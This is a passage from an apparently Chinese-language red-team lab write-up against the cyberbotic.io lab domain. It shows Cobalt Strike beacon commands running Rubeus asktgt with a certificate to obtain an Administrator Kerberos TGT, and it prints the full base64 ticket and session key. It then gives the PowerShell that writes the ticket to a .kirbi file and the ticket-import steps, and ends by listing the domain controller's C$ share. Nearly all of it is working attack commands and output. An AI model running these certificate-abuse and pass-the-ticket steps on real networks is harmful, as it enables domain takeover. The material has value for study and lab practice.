v43IdG5cxJyRpFQbqbmLj6lOpctxIM17/O+lUbuWRcEwIMDKwxrYFq9Ad7+KFmFIbAazJ2ssIEggG37p9RqPEoQBFj2X5tRUlIaV4ALKJoyownxgXO0as1brW4zFxhi3aWWJ6Xmkey1i0rQGXQxs65KU+10TbVQJKVJkqdi7PePXoEXjOEbm0llXJTnsHWZgJv7UnvjLuYunnVsBEIMOmHTrNbZ6iGfm3RkqXkh/UwE3FCrUdQhusAKcNeNk+fFyCotb1yOXupaxPnRN2mJZX1VVLJ82jFdJtmKHSVebeO6PFSeuZW8KR5C0RkFVon7cIBzjJYyQRAiRNtrWt5Uvl9QYWN98Tcy8s0fDTW+IGsEKyw7gGRkKNw6PonyGy5mv2L0htvHrgROh3tNcCs9Q53/R5uXOsiXd4Orsyyeco/e44Rk2terxfGn2Rl9HdOrPyjJiS8nPwYNVZOSzeAD5a8WEneMALdKsrrv6n8s5FF19QVdU/UFaiaD6Ysx9VrDqRswGJZYFGdq8BKRyqt+Vg4FEN4NE28OImo+E0O1+UYhxxNSa0Bk0I9QZkqYt8xs8FvfpE2qnFu1Y5C7mUZpbFsJf8rfY5acX7R+F1qsnMEMB8M6/xSTrgjhm3awHx0wEEvcPuEFAAAAAAAAAAAAAAAAAAAAAAAADA9MCEwCQYFKw4DAhoFAAQUc/T21B+Rqbwx6os1zsuIXVUStvwEFGTCHYEi8a9KZwdc8p3/8s7f3V5sAgIEAAAA /password:password /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:Administrator /domain:cyberbotic.io /certificate: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 /password:password /nowrap
[+] host called home, sent: 592221 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: Ask TGT


[+] received output:
[*] Using PKINIT with etype rc4_hmac and subject: CN=User 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'cyberbotic.io\Administrator'

[+] received output:
[*] Using domain controller: 10.10.15.75:88

[+] received output:
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

[+] received output:

  ServiceName              :  krbtgt/cyberbotic.io
  ServiceRealm             :  CYBERBOTIC.IO
  UserName                 :  Administrator
  UserRealm                :  CYBERBOTIC.IO
  StartTime                :  8/21/2022 10:50:09 AM
  EndTime                  :  8/21/2022 8:50:09 PM
  RenewTill                :  8/28/2022 10:50:09 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  CaFk84X82D6qwE+CX46a6w==
  ASREP (key)              :  CE9F4564DCB1FE098A98EA9D42A69871


```

6. 制作成一张tgt
```
[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\dc-1-tgt.kirbi", [Convert]::FromBase64String("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"))
```


7. 导入ticket，成功访问dc-1
```
beacon> make_token CYBER\Administrator FakePass
[*] Tasked beacon to create a token for CYBER\Administrator
[+] host called home, sent: 46 bytes
[+] Impersonated DEV\bfarmer
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\dc-1-tgt.kirbi
[*] Tasked beacon to apply ticket in C:\Users\Administrator\Desktop\dc-1-tgt.kirbi
[+] host called home, sent: 3072 bytes
beacon> ls \\dc-1.cyberbotic.io\c$
[*] Tasked beacon to list files in \\dc-1.cyberbotic.io\c$
[+] host called home, sent: 41 bytes
[*] Listing: \\dc-1.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 09:22:26   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/25/2022 11:20:17   inetpub
          dir     02/23/2018 11:06:05   PerfLogs
          dir     08/21/2022 10:22:29   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/25/2022 12:10:08   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     01/20/2022 15:50:53   Shares
          dir     02/19/2021 10:18:17   System Volume Information
          dir     05/15/2021 16:48:31   Users
          dir     08/21/2022 10:13:50   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     08/21/2022 08:26:50   pagefile.sys
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661079322647.png)